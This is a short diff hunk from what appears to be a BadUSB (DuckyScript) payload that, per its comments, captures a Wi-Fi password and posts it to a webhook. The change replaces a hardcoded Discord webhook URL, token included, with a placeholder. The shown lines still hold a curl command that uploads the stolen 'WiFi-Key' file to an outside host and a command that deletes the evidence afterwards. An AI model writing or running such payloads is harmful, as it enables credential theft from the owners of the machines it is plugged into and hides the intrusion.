@@ -23,7 +23,7 @@ REM next command will post wifi password on webhook.site
 REM watch demo on techchip youtube channel
 REM Modified to use CURL instead of powershell
 REM DONTFORGET to change Encode Language to "United States" 
-STRING curl -F file1=@WiFi-Key https://discord.com/api/webhooks/1138760324321919038/YMNwr2nXrhjbfgX-3s6TGUxKi4o-zCKVbj1jx41K26SxOTWnTuxLl7aa1ir91xoVTxVo
+STRING curl -F file1=@WiFi-Key <discord web hook>
 ENTER
 DELAY 500
 STRING del Wi* /s/f/q
